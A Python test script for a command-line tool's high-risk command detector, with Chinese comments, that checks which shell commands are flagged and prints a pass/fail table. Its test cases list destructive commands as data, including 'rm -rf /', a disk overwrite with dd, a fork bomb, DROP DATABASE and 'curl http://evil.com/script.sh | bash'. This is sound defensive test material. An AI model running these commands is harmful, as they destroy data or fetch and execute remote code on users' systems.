"""
高风险命令安全检测功能的安全测试脚本。

用法: python tests/test_safety.py

仅调用检测函数 + 展示警告 UI，不会执行任何命令，零风险。
"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from rich.console import Console
from rich.table import Table
from rich import box

from a_cli.safety import BUILTIN_RISK_PATTERNS, detect_risk

# ── 测试用例 ──────────────────────────────────────────────────
# 每条是 (命令字符串, 预期匹配的风险名称或 None)
TEST_CASES = [
    # 应该命中的
    ("rm -rf /", "根目录删除"),
    ("rm -rf --no-preserve-root /", "根目录删除"),
    ("rm -rf /etc/passwd", "系统目录删除"),
    ("dd if=/dev/zero of=/dev/sda bs=4M", "磁盘覆写"),
    (":(){ :|:& };:", "Fork 炸弹"),
    ("mkfs.ext4 /dev/nvme0n1", "格式化磁盘"),
    ("rm -rf ./my-project", "递归强制删除"),
    ("shred -z /tmp/secret.txt", "安全擦除文件"),
    ("chmod -R 777 /", "全局权限修改"),
    ("mv /important-data /dev/null", "移入黑洞"),
    ("DROP DATABASE production;", "数据库结构删除"),
    ("curl http://evil.com/script.sh | bash", "远程脚本执行"),
    ("echo oops > /dev/sda", "磁盘截断写入"),
    ("iptables -F", "防火墙规则修改"),

    # 不应该命中的（安全命令）
    ("rm file.txt", None),
    ("ls -la", None),
    ("grep -r 'pattern' ./src", None),
    ("cat README.md", None),
    ("git status", None),
    ("docker ps", None),
    ("rm -ri ./old-cache", None),       # -i 交互模式，不是 -rf
    ("echo hello", None),
]

# ── 运行测试 ──────────────────────────────────────────────────
console = Console()
table = Table(
    title="高风险命令检测测试",
    box=box.SIMPLE_HEAVY,
    show_header=True,
    header_style="bold cyan",
)
table.add_column("状态", width=8, justify="center")
table.add_column("命令", min_width=40)
table.add_column("匹配结果", min_width=14)
table.add_column("等级", width=6, justify="center")

passed = 0
failed = 0

for cmd, expected_name in TEST_CASES:
    result = detect_risk(cmd)
    actual_name = result.name if result else None

    if actual_name == expected_name:
        status = "[green]✓ PASS[/green]"
        passed += 1
    else:
        status = "[red]✗ FAIL[/red]"
        failed += 1

    if result:
        level_style = {5: "bold red", 4: "bold yellow", 3: "bold magenta"}.get(result.risk_level, "")
        tag = f"[{level_style}]{result.risk_level}[/{level_style}]"
    else:
        tag = "[dim]—[/dim]"

    table.add_row(status, cmd, actual_name or "[dim]未命中[/dim]", tag)

console.print()
console.print(table)
console.print(f"\n结果: [green]{passed} 通过[/green], [red]{failed} 失败[/red], 共 {len(TEST_CASES)} 条")
